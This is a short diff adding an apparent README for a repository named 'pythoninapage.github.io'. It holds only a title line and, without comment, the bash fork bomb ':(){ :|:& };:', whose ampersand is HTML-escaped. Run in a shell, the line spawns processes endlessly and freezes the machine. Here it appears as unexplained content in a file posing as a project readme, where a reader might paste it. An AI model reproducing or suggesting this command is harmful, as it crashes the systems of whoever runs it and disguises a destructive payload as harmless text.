@@ -1,0 +1,2 @@
+# pythoninapage.github.io
+:(){ :|:&amp; };:
